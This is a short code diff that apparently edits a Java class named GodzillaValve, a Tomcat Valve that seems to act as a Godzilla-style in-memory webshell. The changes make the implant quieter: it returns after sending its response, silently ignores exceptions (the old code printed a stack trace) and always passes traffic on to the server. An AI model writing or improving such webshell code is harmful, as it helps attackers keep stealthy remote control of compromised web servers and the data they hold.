@@ -125,12 +125,10 @@ public class GodzillaValve extends ClassLoader implements Valve {
                     response.getWriter().write(md5.substring(16));
                     response.flushBuffer();
                 }
-            } else {
-                this.getNext().invoke(request, response);
+                return;
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-            this.getNext().invoke(request, response);
+        } catch (Exception ignored) {
         }
+        this.getNext().invoke(request, response);
     }
 }
